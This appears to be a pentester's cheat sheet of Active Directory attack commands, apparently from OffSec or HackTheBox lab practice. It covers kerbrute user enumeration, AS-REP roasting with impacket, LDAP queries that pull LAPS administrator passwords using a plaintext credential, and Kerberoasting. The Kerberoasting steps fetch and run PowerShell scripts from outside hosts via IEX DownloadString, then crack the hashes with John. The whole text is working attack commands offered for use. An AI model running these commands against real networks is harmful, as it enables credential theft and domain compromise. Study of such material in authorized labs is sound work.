#Enum users
kerbrute userenum [USERFILE] --dc [IP] -d [Domain.com]

#Enum user and their TGTs
impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/

#Search user on ldpa
ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName

#When we have a valid cred, we can search admin password
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
****note: LAPS periodically changes the local administrator's password when it expires, but only if password expires!

#Attacking the SPN:
    0. powershell IEX(New-Object Net.Webclient).DownloadString("http://192.168.49.170/GetUserSPNs.ps1")
    1. Add-Type -AssemblyName System.IdentityModel
    2. New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
    3. powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.140:8000/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat John"
    4.copy the hashes and crack it with John
